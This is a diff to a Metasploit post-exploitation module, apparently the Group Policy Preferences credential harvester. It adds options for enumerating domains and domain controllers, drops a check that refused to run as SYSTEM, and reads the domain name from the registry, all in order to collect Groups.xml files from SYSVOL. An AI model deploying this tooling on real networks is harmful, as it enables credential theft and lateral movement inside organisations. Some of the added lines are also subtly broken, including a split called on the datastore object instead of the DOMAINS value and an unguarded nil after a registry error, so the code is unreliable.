@@ -8,10 +8,12 @@
 require 'msf/core'
 require 'rex'
 require 'rexml/document'
+require 'msf/core/post/windows/registry'
 
 class Metasploit3 < Msf::Post
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::Priv
+	include Msf::Post::Windows::Registry
 
 	def initialize(info={})
 		super( update_info( info,
@@ -43,13 +45,13 @@ class Metasploit3 < Msf::Post
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
+		register_options([
+			OptBool.new('ALL', [ false, 'Enumerate all domains on network.', true]),
+       		OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
+
 	end
 
 	def run
-		if is_system?
-			print_error "This needs to be run as a Domain User, not SYSTEM"
-			return nil
-		end
 
 		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
 		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
@@ -69,10 +71,19 @@ class Metasploit3 < Msf::Post
 		basepaths = []
 		fullpaths = []
 
+		print_status "Checking locally.."
 		basepaths << get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL"))
 
-		domains = enum_domains
-		domains.reject!{|n| n == "WORKGROUP"}
+		if datastore['ALL']
+			domains = enum_domains
+			domains.reject!{|n| n == "WORKGROUP"}
+		end
+
+		datastore.split('').each{|ud| domains << ud} if datastore['DOMAINS']
+		domains << get_domain_reg
+		domains.flatten!
+		domains.compact!
+
 		domains.each{ |domain| dcs << enum_dcs(domain)}
 		dcs.flatten!
 		dcs.compact!
@@ -278,6 +289,20 @@ class Metasploit3 < Msf::Post
 			hostnames << t[:dc_hostname]
 		}
 		return hostnames
+	end
+
+	def get_domain_reg
+		begin
+			subkey = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\"
+			v_name = "Domain"
+			domain = registry_getvaldata(subkey, v_name)
+			print_status "domain #{domain.inspect}"
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
+		end
+		domain = domain.split('.')[0]
+
+		return domain
 	end
 
 end
